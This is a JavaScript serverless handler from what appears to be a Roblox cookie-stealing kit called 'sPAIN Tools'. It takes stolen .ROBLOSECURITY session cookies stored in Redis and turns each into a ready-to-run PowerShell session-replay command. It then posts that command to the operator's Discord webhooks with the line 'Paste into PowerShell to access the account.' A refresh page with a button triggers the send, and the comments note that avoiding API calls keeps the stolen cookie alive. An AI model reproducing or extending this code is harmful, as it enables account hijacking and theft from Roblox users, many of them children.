// api/refresh.js
// Refresh page: stores the cookie, builds fresh PowerShell on demand.
// Zero Roblox API calls — cookie stays alive.

const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

// ── Build "Copy as PowerShell" for roblox.com/home — no API calls ────────────
function buildPowerShell(cookie) {
  const escaped = cookie.replace(/`/g, '``').replace(/"/g, '`"');
  return `$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "${escaped}", "/", "roblox.com")))
Invoke-WebRequest -UseBasicParsing -Uri "https://www.roblox.com/home" \`
-WebSession $session \`
-Headers @{
  "authority"="www.roblox.com"
  "accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
  "accept-language"="en-US,en;q=0.9"
  "cache-control"="max-age=0"
  "referer"="https://www.roblox.com/"
  "sec-ch-ua"='"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"'
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"='"Windows"'
  "sec-fetch-dest"="document"
  "sec-fetch-mode"="navigate"
  "sec-fetch-site"="same-origin"
  "sec-fetch-user"="?1"
  "upgrade-insecure-requests"="1"
}`;
}

// ── Discord ───────────────────────────────────────────────────────────────────
async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text) {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1950); rem = rem.substring(1950);
    const content = first
      ? '```powershell\n' + chunk + (rem.length === 0 ? '\n```' : '')
      : chunk + (rem.length === 0 ? '\n```' : '');
    await discordSend(url, { content });
    first = false;
  }
}

async function sendPSToDiscord(webhookUrl, powershell, pageName) {
  const now = new Date().toISOString();
  await discordSend(webhookUrl, {
    embeds: [{
      title:       '🔄 Fresh PowerShell',
      description: `Regenerated for **${pageName}**\nPaste into PowerShell to access the account.`,
      color:       0x06b6d4,
      footer:      { text: `sPAIN Tools • ${now}` }
    }]
  });
  await discordChunked(webhookUrl, powershell);
}

// ── Page HTML ─────────────────────────────────────────────────────────────────
function buildPage(id) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>sPAIN Tools — Refresh</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root{--bg:#080810;--card:#0d0d1a;--accent:#c026d3;--accent2:#a855f7;--accent3:#06b6d4;--text:#f0f0f8;--muted:#5a5a78}
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;overflow:hidden}
  body::after{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");pointer-events:none;z-index:9999;opacity:0.5}
  .aurora{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
  .blob{position:absolute;border-radius:50%;filter:blur(100px);opacity:0.12}
  .blob1{width:700px;height:700px;background:var(--accent);top:-200px;left:-200px;animation:drift 14s ease-in-out infinite alternate}
  .blob2{width:500px;height:500px;background:var(--accent3);bottom:-100px;right:-100px;animation:drift 18s ease-in-out infinite alternate;animation-delay:-6s}
  @keyframes drift{from{transform:translate(0,0)}to{transform:translate(50px,30px)}}
  .card{position:relative;z-index:2;background:var(--card);border:1px solid rgba(192,38,211,0.18);border-radius:20px;padding:48px 44px;width:100%;max-width:440px;box-shadow:0 0 80px rgba(192,38,211,0.08),0 30px 80px rgba(0,0,0,0.5);text-align:center}
  .card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent3));border-radius:20px 20px 0 0}
  .logo{font-family:'Orbitron',sans-serif;font-size:1.1rem;font-weight:900;letter-spacing:0.05em;margin-bottom:28px}
  .logo span{color:var(--accent);text-shadow:0 0 16px rgba(192,38,211,0.5)}
  p{color:var(--muted);font-size:0.88rem;line-height:1.7;margin-bottom:36px}
  .btn{width:100%;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;padding:17px 0;border-radius:12px;font-family:'Orbitron',sans-serif;font-size:0.82rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;cursor:pointer;box-shadow:0 0 36px rgba(192,38,211,0.4);transition:transform .2s,box-shadow .2s,opacity .2s}
  .btn:hover{transform:translateY(-2px);box-shadow:0 0 56px rgba(192,38,211,0.65)}
  .btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
  .status{margin-top:18px;font-size:.75rem;letter-spacing:.06em;min-height:20px;color:var(--muted)}
  .ok{color:#4ade80}.err{color:#f472b6}
</style>
</head>
<body>
<div class="aurora"><div class="blob blob1"></div><div class="blob blob2"></div></div>
<div class="card">
  <div class="logo">s<span>PAIN</span> Tools</div>
  <p>Click the button to send a fresh <strong>PowerShell command</strong> for <code>roblox.com/home</code> to your Discord webhook.</p>
  <button class="btn" id="btn" onclick="go()">&#x1F504; Get Fresh PowerShell</button>
  <div class="status" id="st"></div>
</div>
<script>
const REFRESH_ID = '${id}';
async function go() {
  const btn = document.getElementById('btn');
  const st  = document.getElementById('st');
  btn.disabled = true; btn.textContent = 'Sending...'; st.className = 'status'; st.textContent = '';
  try {
    const r = await fetch('/api/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: REFRESH_ID })
    });
    const d = await r.json();
    if (d.success) {
      btn.textContent = '\\u2713 Sent to Discord!';
      btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
      btn.style.boxShadow  = '0 0 36px rgba(34,197,94,0.4)';
      st.className = 'status ok'; st.textContent = 'PowerShell sent. Check your webhook.';
      setTimeout(() => {
        btn.disabled = false; btn.textContent = '\\u{1F504} Get Fresh PowerShell';
        btn.style.background = ''; btn.style.boxShadow = '';
        st.textContent = ''; st.className = 'status';
      }, 4000);
    } else {
      btn.disabled = false; btn.textContent = '\\u{1F504} Get Fresh PowerShell';
      st.className = 'status err'; st.textContent = d.error || 'Something went wrong.';
    }
  } catch {
    btn.disabled = false; btn.textContent = '\\u{1F504} Get Fresh PowerShell';
    st.className = 'status err'; st.textContent = 'Network error. Try again.';
  }
}
</script>
</body>
</html>`;
}

// ── Body parser ───────────────────────────────────────────────────────────────
function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

// ── Handler ───────────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  // ── GET: serve the HTML page ──────────────────────────────────────────────
  if (req.method === 'GET') {
    const refreshId = new URL('http://x' + req.url).searchParams.get('id') || '';
    if (!refreshId) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(400).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6">Missing refresh ID</h1>');
    }
    const record = await redisGet(`refresh:${refreshId}`);
    if (!record) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(404).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6;background:#080810;min-height:100vh;display:block">Link expired or not found</h1>');
    }
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(buildPage(refreshId));
  }

  // ── POST: build PowerShell from stored cookie, send to Discord ────────────
  if (req.method === 'POST') {
    // ID comes from the request BODY only — the URL for POST is just /api/refresh
    const body   = parseBody(req.body);
    const postId = body?.id;

    if (!postId) return res.status(400).json({ error: 'id is required in request body' });

    const record = await redisGet(`refresh:${postId}`);
    if (!record)         return res.status(404).json({ error: 'Link not found or expired' });
    if (!record.cookie)  return res.status(500).json({ error: 'No cookie stored' });
    if (!record.webhook) return res.status(500).json({ error: 'No webhook stored' });

    // Build PS locally — zero Roblox API calls, cookie stays alive
    const powershell = buildPowerShell(record.cookie);
    const pageName   = record.pageName || postId;

    const webhooks = [record.webhook];
    if (record.webhook1 && record.webhook1 !== record.webhook) webhooks.push(record.webhook1);

    await Promise.all(webhooks.map(wh => sendPSToDiscord(wh, powershell, pageName)));

    return res.status(200).json({ success: true });
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
